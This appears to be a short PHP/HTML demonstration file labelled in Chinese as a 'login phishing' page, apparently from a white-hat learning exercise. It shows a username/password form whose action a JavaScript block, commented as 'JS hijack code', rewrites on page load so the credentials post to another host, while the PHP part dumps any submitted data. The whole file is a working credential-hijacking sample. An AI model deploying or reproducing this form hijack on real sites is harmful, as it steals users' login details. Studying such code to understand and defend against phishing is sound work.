<?php
	echo "<pre>";
	$userInfo = $_POST ;
	if ($userInfo) {
		# code...
		var_dump($userInfo,'登录成功') ;exit();
	}

?>
<!DOCTYPE html>
<html>
<head>
	<title>登录钓鱼</title>
</head>
<body>
	<form id="login" method="post" action="">
		用户姓名:<input type="text" name="name">
		用户密码:<input type="password" name="pwd">
		<input type="submit" value="确认登录">
	</form>
</body>
<script type="text/javascript">

	//js劫持代码
	window.onload = function (eve) {
		var form = document.getElementById('login');
		form.innerHTML = ' <form id="login" method="post" > 用户姓名:<input type="text" name="name"> 用户密码:<input type="password" name="pwd"> <input type="submit" value="确认登录">	</form> '  ;
		form.action = "http://base.com/Self/SomeSafety/WhiteHat/A-3-login2.php" ;
	}
</script>
</html>